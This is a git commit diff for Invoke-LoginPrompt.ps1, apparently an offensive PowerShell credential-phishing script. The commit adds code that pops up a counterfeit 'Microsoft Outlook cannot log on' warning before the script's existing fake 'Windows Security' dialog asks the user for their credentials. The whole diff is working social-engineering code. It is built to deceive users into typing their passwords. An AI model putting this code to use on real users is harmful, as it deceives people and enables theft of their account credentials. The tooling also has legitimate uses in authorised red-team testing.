ba21eabada2f8b48c7dea295dbab8cc5da22fbbf
Rasta Mouse <rasta@rastamouse.me>
2017-06-17 21:46:58 +0100

    Add Error Popup

--- Invoke-LoginPrompt.ps1
+++ Invoke-LoginPrompt.ps1
@@ -15,6 +15,11 @@ http://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask
 #>
 
 function Invoke-LoginPrompt{
+
+    [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
+    [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
+    [System.Windows.Forms.MessageBox]::Show("Outlook cannot log on.  Verify you are connected to the network and are using the proper server and mailbox name. The Microsoft Exchange information service in your profile is missing required information. Modify your profile to ensure that you are using the correct Microsoft Exchange information service.","Microsoft Outlook",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)
+
     $cred = $Host.ui.PromptForCredential("Windows Security", "Please enter user credentials", "$env:userdomain\$env:username","")
     $username = "$env:username"
     $domain = "$env:userdomain"
